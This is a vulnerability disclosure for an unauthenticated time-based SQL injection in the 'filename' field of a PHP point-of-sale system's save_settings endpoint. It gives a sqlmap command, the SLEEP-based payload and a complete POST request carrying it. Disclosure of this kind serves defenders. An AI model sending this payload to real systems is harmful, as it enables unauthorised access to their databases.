# Best pos management system in php V1.0 - SQL injection vulnerability

### You do not need to log in and open the website storage directory

Supplier:https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

http://localhost/ajax.php?action=save_settings   -----> POST request ----->  'filename' can control some file name parameters

Vulnerability location: admin_class.php in the root directory of the website. Triggered by the save_settings function in ajax.php

Web function point, after logging into the background, System Settings ->Image

Note: Triggering this vulnerability does not require logging in.

![1](/img/Best-pos-management-system-in-php/8.png)

Location of SQL injection vulnerabilities in source code: Lines 165 to 174 in admin_class.php under the root directory.

![2](/img/Best-pos-management-system-in-php/7.png)

Sqlmap Payload:sqlmap -r post2 --dbms=mysql -v 3

![3](/img/Best-pos-management-system-in-php/6.png)

Note: I added * after the 'filename' parameter in POST2 to tell sqlmap where to inject the parameter, which is not shown in the figure

The injection point occurs in the 'filename' parameter of the post request package

Payload:shell.png' AND (SELECT 7769 FROM (SELECT(SLEEP(15)))a) AND '1'='1

POST:
```
POST /ajax.php?action=save_settings HTTP/1.1
Host: www.kruxton.com:8083
Content-Type: multipart/form-data; boundary=---------------------------988021490109555064829866363
Content-Length: 718

-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="name"

2
-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="email"

3@qq.com
-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="contact"

3
-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="about"

111
-----------------------------988021490109555064829866363
Content-Disposition: form-data; name="img"; filename="shell.png' AND (SELECT 7769 FROM (SELECT(SLEEP(15)))a) AND '1'='1"
Content-Type: image/png

222
-----------------------------988021490109555064829866363--
```

give the result as follows

![4](/img/Best-pos-management-system-in-php/10.png)

Successfully triggered a delay of about 15 seconds!